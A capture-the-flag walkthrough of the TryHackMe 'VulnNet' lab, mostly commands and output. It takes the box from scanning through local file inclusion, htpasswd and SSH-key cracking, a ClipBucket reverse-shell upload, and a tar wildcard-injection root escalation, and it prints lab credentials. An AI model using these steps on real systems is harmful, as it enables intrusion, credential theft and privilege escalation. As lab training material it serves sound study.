@@ -1,0 +1,406 @@
+Vulnet
+
+LINK:https://tryhackme.com/room/vulnnet1
+
+NMAP RESULTS:
+
+Nmap scan report for vulnnet.thm (10.10.222.14)
+Host is up, received syn-ack (0.23s latency).
+Scanned at 2021-03-18 09:06:05 EDT for 13s
+
+PORT   STATE SERVICE REASON  VERSION
+22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 ea:c9:e8:67:76:0a:3f:97:09:a7:d7:a6:63:ad:c1:2c (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwkZ4lon+5ZNgVQmItwLRcbDT9QrJJGvPrfqsbAnwk4dgPz1GDjIg+RwRIZIwPGRPpyvd01W1vh0BNs7Uh9f5RVuojlLxjqsN1876Jvt5Ma7ajC49lzxmtI8B5Vmwxx9cRA8JBvENm0+BTsDjpaj3JWllRffhD25Az/F1Tz3fSua1GiR7R2eEKSMrD38+QGG22AlrCNHvunCJkPmYH9LObHq9uSZ5PbJmqR3Yl3SJarCZ6zsKBG5Ka/xJL17QUB5o6ZRHgpw/pmw+JKWUkodIwPe4hCVH0dQkfVAATjlx9JXH95h4EPmKPvZuqHZyGUPE5jPiaNg6YCNCtexw5Wo41
+|   256 0f:c8:f6:d3:8e:4c:ea:67:47:68:84:dc:1c:2b:2e:34 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBA8L+SEmXtvfURdTRsmhaay/VJTFJzXYlU/0uKlPAtdpyZ8qaI55EQYPwcPMIbvyYtZM37Bypg0Uf7Sa8i1aTKk=
+|   256 05:53:99:fc:98:10:b5:c3:68:00:6c:29:41:da:a5:c9 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKNuqHl39hJpIduBG9J7QwetpgO1PWQSUDL/rvjXPiWw
+80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
+|_http-favicon: Unknown favicon MD5: 8B7969B10EDA5D739468F4D3F2296496
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: VulnNet
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+on enumerating the webpage, i can't access the login form
+
+
+AFTER ENUMERATING THE SUBDOMAINS USING GOBUSTER:
+
+┌──(kali㉿kali)-[~/vulnet]
+└─$ gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://vulnnet.thm     
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:          http://vulnnet.thm
+[+] Threads:      10
+[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+[+] User Agent:   gobuster/3.0.1
+[+] Timeout:      10s
+===============================================================
+2021/03/18 11:09:27 Starting gobuster
+===============================================================
+Found: gc._msdcs.vulnnet.thm (Status: 400) [Size: 424]
+Found: broadcast.vulnnet.thm (Status: 401) [Size: 468]
+===============================================================
+2021/03/18 11:10:51 Finished
+===============================================================
+ WE GET TWO SUBDOMAINS(the broadcast one is valid)
+ BUT IT IS A HTTP BASIC AUTHORIZATION FORM, AND I DON'T HAVE THE CREDS
+
+THERE IS A DEAD END
+I AGAIN CHECK THE WEBPAGE, AND THIS TIME I ENUMERATE THE JAVASCRIPT FILES:
+SO IN THE 'js/index__d8338055.js' FILE:
+
+  }, t.o = function(property, object) {
+    return Object.prototype.hasOwnProperty.call(property, object);
+  }, t.p = "http://vulnnet.thm/index.php?referer=", t(t.s = 0);
+}({
+  0 : function(module, object, instantiate) {
+    module.exports = instantiate("O14P");
+  },
+  O14P : function(vdwB, d, options) {
+
+
+  WE CAN SEE THAT 'referer' IS WORKING AS A GET PARAMETER, SO LETS CHECK FOR LFI:
+
+  REQUEST:"http://vulnnet.thm/index.php?referer=/etc/passwd
+
+ root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+uuidd:x:105:111::/run/uuidd:/usr/sbin/nologin
+lightdm:x:106:113:Light Display Manager:/var/lib/lightdm:/bin/false
+whoopsie:x:107:117::/nonexistent:/bin/false
+kernoops:x:108:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
+pulse:x:109:119:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
+avahi:x:110:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
+hplip:x:111:7:HPLIP system user,,,:/var/run/hplip:/bin/false
+server-management:x:1000:1000:server-management,,,:/home/server-management:/bin/bash
+mysql:x:112:123:MySQL Server,,,:/nonexistent:/bin/false
+sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
+
+we have 2 users in this box: 'server-management' and 'root'
+
+WE KNOW , PREVIOUSLY WE GOT THE HTTP AUTHORIZATION PAGE , THE CREDENTIALS FOR THIS PAGE IS BY DEFAULT STORED IN .htpasswd FILE 
+SO NAGIVAGATING THROUGH /etc/apache2/.htpasswd FILE:
+
+developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0
+
+WE GOT SOME CREDS, LETS USE JOHN THE RIPPER TO CRACK THE PASSWORD
+
+┌──(kali㉿kali)-[~/vulnet]
+└─$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash                                                                   1 ⚙
+[sudo] password for kali: 
+Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
+Use the "--format=md5crypt-long" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 SSE2 4x3])
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+9972761drmfsls   (developers)
+1g 0:00:00:46 DONE (2021-03-18 12:45) 0.02147g/s 46406p/s 46406c/s 46406C/s 9975934..99686420
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+
+
+NOW NAVIGATE THROUGH THE broadcast.vulnnet.thm DOMAIN AND TRY TO LOGIN
+
+we got a webpage named clipbucket , in the source code i got the version number of the program:
+<!-- ClipBucket version 4.0 -->
+
+LETS CHECK SEARCHSPLOIT:
+ClipBucket < 4.0.0 - Release 4902 - Command Injection / File Upload / SQL Injection | php/webapps/44250.txt                                           
+
+
+2. Unauthenticated Arbitrary File Upload
+Below is the cURL request to upload arbitrary files to the webserver with no
+authentication required.
+
+$ curl -F "file=@pfile.php" -F "plupload=1" -F "name=anyname.php"
+"http://$HOST/actions/beats_uploader.php"
+
+$ curl -F "file=@pfile.php" -F "plupload=1" -F "name=anyname.php"
+"http://$HOST/actions/photo_uploader.php"
+
+LETS MODIFY THE CURL COMMAND AND TRY TO UPLOAD THE REVERSE SHELL:
+
+┌──(kali㉿kali)-[~/vulnet]
+└─$ curl -u developers:9972761drmfsls -F "file=@rev.php" -F "plupload=1" -F "name=rev.php" "http://broadcast.vulnnet.thm/actions/beats_uploader.php"
+creating file{"success":"yes","file_name":"1616086897011d4d","extension":"php","file_directory":"CB_BEATS_UPLOAD_DIR"}  
+
+I THINK OUR FILE IS UPLOADED
+
+┌──(kali㉿kali)-[~/vulnet]
+└─$ 
+┌──(kali㉿kali)-[~/vulnet]
+└─$ nc -nvlp 1234 
+listening on [any] 1234 ...
+connect to [10.8.73.218] from (UNKNOWN) [10.10.75.240] 37184
+Linux vulnnet 4.15.0-134-generic #138-Ubuntu SMP Fri Jan 15 10:52:18 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
+ 18:02:27 up  1:57,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ 
+
+WE GOT THE SHELL
+
+ENUMERATING DEEPER:
+www-data@vulnnet:/var/www/html/includes$ cat dbconnect.php 
+<?php
+
+	/**
+	* @Software : ClipBucket
+	* @License : CBLA
+	* @version :ClipBucket v2.1
+	*/
+
+	$BDTYPE = 'mysql';
+	//Database Host
+	$DBHOST = '';
+	//Database Name
+	$DBNAME = 'VulnNet';
+	//Database Username
+	$DBUSER = 'admin';
+	//Database Password
+	$DBPASS = 'VulnNetAdminPass0990';
+	//Setting Table Prefix
+	define('TABLE_PREFIX','cb_');
+
+
+	GOT SOME CREDS, LETS TRY THESE
+NOTHING IMP IN THE MYSQL SERVR
+
+IN THE /var/backup FOLDER:
+www-data@vulnnet:/var/backups$ ls -la
+
+-rw-rw-r--  1 server-management server-management    1484 Jan 24 14:08 ssh-backup.tar.gz
+-rw-r--r--  1 root              root                49338 Jan 25 23:28 vulnnet-Monday.tgz
+-rw-r--r--  1 root              root                49338 Mar 18 18:50 vulnnet-Thursday.tgz
+
+GOT THIS SSH BACKUP WHICH IS READABLE BY ANYONE, SO I DOWNLOAD THIS FILE TO MY LOCAL MACHINE:
+
+┌──(kali㉿kali)-[~/vulnet]
+└─$ wget --user=developers --password=9972761drmfsls http://broadcast.vulnnet.thm:8000/ssh-backup.tar.gz                                                            2 ⨯
+--2021-03-18 13:49:56--  http://broadcast.vulnnet.thm:8000/ssh-backup.tar.gz
+Resolving broadcast.vulnnet.thm (broadcast.vulnnet.thm)... 10.10.75.240
+Connecting to broadcast.vulnnet.thm (broadcast.vulnnet.thm)|10.10.75.240|:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1484 (1.4K) [application/gzip]
+Saving to: ‘ssh-backup.tar.gz’
+
+ssh-backup.tar.gz                         100%[=====================================================================================>]   1.45K  --.-KB/s    in 0s      
+
+2021-03-18 13:49:57 (226 MB/s) - ‘ssh-backup.tar.gz’ saved [1484/1484]
+
+                                    
+LETS EXTRACT THIS ARCHIVE:
+
+┌──(kali㉿kali)-[~/vulnet]
+└─$ tar xvf ssh-backup.tar.gz 
+id_rsa
+                                                                                                                                                                                                                                                                                                                 
+┌──(kali㉿kali)-[~/vulnet]
+└─$ cat id_rsa                                                                                           
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,6CE1A97A7DAB4829FE59CC561FB2CCC4
+
+mRFDRL15t7qvaZxJGHDJsewnhp7wESbEGxeAWtCrbeIVJbQIQd8Z8SKzpvTMFLtt
+dseqsGtt8HSruVIq++PFpXRrBDG5F4rW5B6VDOVMk1O9J4eHEV0N7es+hZ22o2e9
+60qqj7YkSY9jVj5Nqq49uUNUg0G0qnWh8M6r8r83Ov+HuChdeNC5CC2OutNivl7j
+dmIaFRFVwmWNJUyVen1FYMaxE+NojcwsHMH8aV2FTiuMUsugOwZcMKhiRPTElojn
+tDrlgNMnP6lMkQ6yyJEDNFtn7tTxl7tqdCIgB3aYQZXAfpQbbfJDns9EcZEkEkrp
+hs5Li20NbZxrtI6VPq6/zDU1CBdy0pT58eVyNtDfrUPdviyDUhatPACR20BTjqWg
+3BYeAznDF0MigX/AqLf8vA2HbnRTYWQSxEnAHmnVIKaNVBdL6jpgmw4RjGzsUctk
+jB6kjpnPSesu4lSe6n/f5J0ZbOdEXvDBOpu3scJvMTSd76S4n4VmNgGdbpNlayj5
+5uJfikGR5+C0kc6PytjhZrnODRGfbmlqh9oggWpflFUm8HgGOwn6nfiHBNND0pa0
+r8EE1mKUEPj3yfjLhW6PcM2OGEHHDQrdLDy3lYRX4NsCRSo24jtgN1+aQceNFXQ7
+v8Rrfu5Smbuq3tBjVgIWxolMy+a145SM1Inewx4V4CX1jkk6sp0q9h3D03BYxZjz
+n/gMR/cNgYjobbYIEYS9KjZSHTucPANQxhUy5zQKkb61ymsIR8O+7pHTeReelPDq
+nv7FA/65Sy3xSUXPn9nhqWq0+EnhLpojcSt6czyX7Za2ZNP/LaFXpHjwYxBgmMkf
+oVmLmYrw6pOrLHb7C5G6eR6D/WwRjhPpuhCWWnz+NBDQXIwUzzQvAyHyb7D1+Itn
+MesF+L9zuUADGeuFl12dLahapM5ZuKURwnzW9+RwmmJSuT0AnN5OyuJtwfRznjyZ
+7f5NP9u6vF0NQHYZI7MWcH7PAQsGTw3xzBmJdIfF71DmG0rqqCR7sB2buhoI4ve3
+obvpmg2CvE+rnGS3wxuaEO0mWxVrSYiWdi7LJZvppwRF23AnNYNTeCw4cbvvCBUd
+hKvhau01yVW2N/R8B43k5G9qbeNUmIZIltJZaxHnQpJGIbwFSItih49Fyr29nURK
+ZJbyJbb4+Hy2ZNN4m/cfPNmCFG+w0A78iVPrkzxdWuTaBOKBstzpvLBA20d4o3ow
+wC6j98TlmFUOKn5kJmX1EQAHJmNwERNKFmNwgHqgwYNzIhGRNdyoqJxBrshVjRk9
+GSEZHtyGNoBqesyZg8YtsYIFGppZFQmVumGCRlfOGB9wPcAmveC0GNfTygPQlEMS
+hoz4mTIvqcCwWibXME2g8M9NfVKs7M0gG5Xb93MLa+QT7TyjEn6bDa01O2+iOXkx
+0scKMs4v3YBiYYhTHOkmI5OX0GVrvxKVyCJWY1ldVfu+6LEgsQmUvG9rYwO4+FaW
+4cI3x31+qDr1tCJMLuPpfsyrayBB7duj/Y4AcWTWpY+feaHiDU/bQk66SBqW8WOb
+d9vxlTg3xoDcLjahDAwtBI4ITvHNPp+hDEqeRWCZlKm4lWyI840IFMTlVqwmxVDq
+-----END RSA PRIVATE KEY-----
+                                                                                                                                                                        
+┌──(kali㉿kali)-[~/vulnet]
+└─$ 
+
+
+WE GOT SOME PRIVATE ENCYPTED KEYS, LETS CRACK THEM USING ss2john
+
+┌──(kali㉿kali)-[~/vulnet]
+└─$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 2 OpenMP threads
+Note: This format may emit false positives, so it will keep trying even after
+finding a possible candidate.
+Press 'q' or Ctrl-C to abort, almost any other key for status
+oneTWO3gOyac     (id_rsa)
+1g 0:00:00:13 DONE (2021-03-18 13:53) 0.07621g/s 1093Kp/s 1093Kc/s 1093KC/sa6_123..*7¡Vamos!
+Session completed
+
+GOT THE PASSWORD
+
+NOW SSH USING THESE TO THE SERVER-MANAGEMENT USER!!
+
+┌──(kali㉿kali)-[~/vulnet]
+└─$ ssh -i id_rsa server-management@vulnnet.thm              
+The authenticity of host 'vulnnet.thm (10.10.75.240)' can't be established.
+ECDSA key fingerprint is SHA256:o3DFbZLKgDIjKXw0C1ptP4MVaCWwTGjXMpOhpnaus+8.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'vulnnet.thm,10.10.75.240' (ECDSA) to the list of known hosts.
+Enter passphrase for key 'id_rsa': 
+Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-134-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+560 packages can be updated.
+359 updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+server-management@vulnnet:~$ 
+
+
+IM IN 
+GOT THE USER FLAG
+
+
+CHECKING THE CRONJOBS:
+
+server-management@vulnnet:~$ cat /etc/crontab 
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+*/2   * * * *	root	/var/opt/backupsrv.sh
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+
+
+LETS CHECK THIS backupsrv.sh FILE:
+
+server-management@vulnnet:~$ cat /var/opt/backupsrv.sh 
+#!/bin/bash
+
+# Where to backup to.
+dest="/var/backups"
+
+# What to backup. 
+cd /home/server-management/Documents
+backup_files="*"
+
+# Create archive filename.
+day=$(date +%A)
+hostname=$(hostname -s)
+archive_file="$hostname-$day.tgz"
+
+# Print start status message.
+echo "Backing up $backup_files to $dest/$archive_file"
+date
+echo
+
+# Backup the files using tar.
+tar czf $dest/$archive_file $backup_files
+
+# Print end status message.
+echo
+echo "Backup finished"
+date
+
+# Long listing of files in $dest to check file sizes.
+ls -lh $dest
+server-management@vulnnet:~$ 
+
+THIS PROGRAM IS MAKING A BACKUP USING THE TAR COMMAND OF THE Documents FOLDER
+LETS CHECK GTFOBINS
+
+server-management@vulnnet:~/Documents$ echo "" > "--checkpoint-action=exec=sh test.sh"
+server-management@vulnnet:~/Documents$ echo "" > --checkpoint=1
+server-management@vulnnet:~/Documents$ echo "chmod +s /bin/bash" > test.sh
+server-management@vulnnet:~/Documents$ 
+
+MAKING THESE FILES IN THE DIRECTORY
+server-management@vulnnet:~/Documents$ ls -la /bin/bash 
+-rwsr-sr-x 1 root root 1113504 Apr  4  2018 /bin/bash
+server-management@vulnnet:~/Documents$ 
+
+YES!!
+WE GOT SUCCESSFULL IN MAKING THE /bin/bash as SUIT BINARY
+
+server-management@vulnnet:~/Documents$ /bin/bash -p
+bash-4.4# id
+uid=1000(server-management) gid=1000(server-management) euid=0(root) egid=0(root) groups=0(root),1000(server-management)
+bash-4.4# whoami
+root
+bash-4.4#
+
+
+WE ARE ROOT
+GOT THE ROOT FLAG
+
